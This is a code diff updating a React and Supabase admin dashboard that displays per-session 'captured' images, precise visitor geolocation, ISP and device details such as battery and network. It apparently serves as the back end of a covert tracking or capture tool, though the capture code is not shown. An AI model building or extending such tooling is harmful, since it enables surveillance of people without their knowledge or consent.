@@ -1,13 +1,24 @@
 import React, { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
 import { supabaseClient } from "../supabaseClient";
 import "./AdminDashboard.css";
 
-export default function AdminDashboard() {
+export default function AdminDashboard({ onLogout }) {
+  const navigate = useNavigate();
   const [images, setImages] = useState([]);
   const [locations, setLocations] = useState([]);
   const [devices, setDevices] = useState([]);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
+  const [selectedImage, setSelectedImage] = useState(null);
+  const [filter, setFilter] = useState('all'); // 'all', 'today', 'week', 'month'
+
+  const handleLogout = () => {
+    if (onLogout) {
+      onLogout();
+      navigate("/admin");
+    }
+  };
 
   useEffect(() => {
     fetchAllData();
@@ -38,103 +49,218 @@ export default function AdminDashboard() {
     }
   };
 
-  if (loading) return <div className="admin-container"><p>Loading...</p></div>;
+  const deleteImage = async (img) => {
+    if (!confirm('Are you sure you want to delete this image?')) return;
+    
+    try {
+      // Extract filename from URL
+      const fileName = img.image_url.split('/').pop();
+      
+      // Delete from storage
+      await supabaseClient.storage.from('images').remove([fileName]);
+      
+      // Delete from database
+      await supabaseClient.from('images_table').delete().eq('id', img.id);
+      
+      // Update state
+      setImages(images.filter(i => i.id !== img.id));
+      setSelectedImage(null);
+    } catch (err) {
+      alert('Error deleting image: ' + err.message);
+    }
+  };
+
+  const filterImages = () => {
+    if (filter === 'all') return images;
+    
+    const now = new Date();
+    const filtered = images.filter(img => {
+      const imgDate = new Date(img.created_at);
+      const diffTime = Math.abs(now - imgDate);
+      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+      
+      if (filter === 'today') return diffDays <= 1;
+      if (filter === 'week') return diffDays <= 7;
+      if (filter === 'month') return diffDays <= 30;
+      return true;
+    });
+    
+    return filtered;
+  };
+
+  const filteredImages = filterImages();
+
+  // Create a map of images by session_id for quick lookup
+  const imagesBySession = {};
+  images.forEach(img => {
+    if (img.session_id && !imagesBySession[img.session_id]) {
+      imagesBySession[img.session_id] = img.image_url;
+    }
+  });
+
+  // Combine location and device data by session_id
+  const combinedData = {};
+  locations.forEach(loc => {
+    if (!combinedData[loc.session_id]) {
+      combinedData[loc.session_id] = {};
+    }
+    combinedData[loc.session_id].location = loc;
+  });
+  devices.forEach(dev => {
+    if (!combinedData[dev.session_id]) {
+      combinedData[dev.session_id] = {};
+    }
+    combinedData[dev.session_id].device = dev;
+  });
+
+  const combinedCards = Object.values(combinedData);
+
+  if (loading) return <div className="admin-container"><p className="loading-text">Loading...</p></div>;
   if (error) return <div className="admin-container"><p className="error">Error: {error}</p></div>;
 
   return (
     <div className="admin-container">
-      <h1>🕵️ Admin Dashboard</h1>
+      <div className="admin-header">
+        <h1>🕵️ Admin Dashboard</h1>
+        <button className="logout-btn" onClick={handleLogout}>🚪 Logout</button>
+      </div>
       
       <div className="dashboard-grid">
-        {/* Images Section */}
+        {/* Combined Locations & Device Section */}
         <div className="section">
-          <h2>📷 Captured Images ({images.length})</h2>
-          {images.length === 0 ? (
-            <p>No images found</p>
+          <div className="combined-header">
+            <h2>� Session Data ({combinedCards.length})</h2>
+          </div>
+
+          {combinedCards.length === 0 ? (
+            <p>No data found</p>
           ) : (
-            <div className="gallery">
-              {images.map((img) => (
-                <div key={img.id} className="image-card">
-                  <a href={img.image_url} target="_blank" rel="noopener noreferrer">
-                    <img src={img.image_url} alt="Capture" />
-                  </a>
-                  <p>{new Date(img.created_at).toLocaleString()}</p>
-                </div>
-              ))}
+            <div className="cards-grid">
+              {combinedCards.map((data, idx) => {
+                const loc = data.location;
+                const dev = data.device;
+                const sessionId = loc?.session_id || dev?.session_id;
+                
+                return (
+                  <div key={idx} className="info-card combined-card">
+                    {imagesBySession[sessionId] && (
+                      <div className="card-image">
+                        <img src={imagesBySession[sessionId]} alt="Session capture" />
+                      </div>
+                    )}
+                    
+                    {/* Location Section */}
+                    {loc && (
+                      <>
+                        <div className="card-header location-header">
+                          <span className="card-icon">📍</span>
+                          <span className="card-type">{loc.location_type}</span>
+                        </div>
+                        <div className="card-body">
+                          <div className="card-row">
+                            <span className="label">Location:</span>
+                            <span className="value">{loc.city}, {loc.country}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Region:</span>
+                            <span className="value">{loc.region || 'N/A'}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Coordinates:</span>
+                            <span className="value">{loc.latitude.toFixed(4)}, {loc.longitude.toFixed(4)}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">ISP:</span>
+                            <span className="value">{loc.isp}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Accuracy:</span>
+                            <span className="value">{loc.accuracy ? Math.round(loc.accuracy) + "m" : "N/A"}</span>
+                          </div>
+                        </div>
+                        <div className="card-footer">
+                          <a 
+                            href={`https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`} 
+                            target="_blank" 
+                            rel="noopener noreferrer"
+                            className="map-link"
+                          >
+                            🗺️ View on Map
+                          </a>
+                        </div>
+                      </>
+                    )}
+
+                    {/* Device Section */}
+                    {dev && (
+                      <>
+                        <div className="card-header device-header">
+                          <span className="card-icon">🖥️</span>
+                          <span className="card-type">{dev.platform}</span>
+                        </div>
+                        <div className="card-body">
+                          <div className="card-row">
+                            <span className="label">Browser:</span>
+                            <span className="value">{dev.browser}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Battery:</span>
+                            <span className="value battery-info">
+                              {dev.battery_level}
+                              {dev.is_charging && ' ⚡'}
+                            </span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Network:</span>
+                            <span className="value">{dev.network_type}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Speed:</span>
+                            <span className="value">{dev.internet_speed}</span>
+                          </div>
+                          <div className="card-row">
+                            <span className="label">Screen:</span>
+                            <span className="value">{dev.screen_resolution}</span>
+                          </div>
+                        </div>
+                      </>
+                    )}
+
+                    {/* Timestamp Footer */}
+                    <div className="card-timestamp">
+                      📅 {new Date(loc?.created_at || dev?.created_at).toLocaleString()}
+                    </div>
+                  </div>
+                );
+              })}
             </div>
-          )}
-        </div>
-
-        {/* Locations Section */}
-        <div className="section">
-          <h2>📍 Location Data ({locations.length})</h2>
-          {locations.length === 0 ? (
-            <p>No locations found</p>
-          ) : (
-            <table className="data-table">
-              <thead>
-                <tr>
-                  <th>Type</th>
-                  <th>Location</th>
-                  <th>Coordinates</th>
-                  <th>ISP</th>
-                  <th>Accuracy</th>
-                  <th>Map</th>
-                </tr>
-              </thead>
-              <tbody>
-                {locations.map((loc) => (
-                  <tr key={loc.id}>
-                    <td>{loc.location_type}</td>
-                    <td>{loc.city}, {loc.country}</td>
-                    <td>{loc.latitude.toFixed(4)}, {loc.longitude.toFixed(4)}</td>
-                    <td>{loc.isp}</td>
-                    <td>{loc.accuracy ? Math.round(loc.accuracy) + "m" : "N/A"}</td>
-                    <td>
-                      <a href={`https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`} target="_blank" rel="noopener noreferrer">
-                        🗺️ View
-                      </a>
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          )}
-        </div>
-
-        {/* Device Section */}
-        <div className="section">
-          <h2>🖥️ Device Information ({devices.length})</h2>
-          {devices.length === 0 ? (
-            <p>No device data found</p>
-          ) : (
-            <table className="data-table">
-              <thead>
-                <tr>
-                  <th>Battery</th>
-                  <th>Network</th>
-                  <th>Speed</th>
-                  <th>Screen</th>
-                  <th>Platform</th>
-                </tr>
-              </thead>
-              <tbody>
-                {devices.map((dev) => (
-                  <tr key={dev.id}>
-                    <td>{dev.battery_level}</td>
-                    <td>{dev.network_type}</td>
-                    <td>{dev.internet_speed}</td>
-                    <td>{dev.screen_resolution}</td>
-                    <td>{dev.platform}</td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
           )}
         </div>
       </div>
 
       <button className="refresh-btn" onClick={fetchAllData}>🔄 Refresh</button>
+
+      {/* Image Modal */}
+      {selectedImage && (
+        <div className="modal-overlay" onClick={() => setSelectedImage(null)}>
+          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
+            <button className="modal-close" onClick={() => setSelectedImage(null)}>✕</button>
+            <img src={selectedImage.image_url} alt="Full size" className="modal-image" />
+            <div className="modal-info">
+              <p><strong>Captured:</strong> {new Date(selectedImage.created_at).toLocaleString()}</p>
+              <p><strong>Session ID:</strong> {selectedImage.session_id}</p>
+              <div className="modal-actions">
+                <a href={selectedImage.image_url} target="_blank" rel="noopener noreferrer" className="download-btn">
+                  ⬇️ Open Original
+                </a>
+                <button className="delete-btn" onClick={() => deleteImage(selectedImage)}>
+                  🗑️ Delete
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
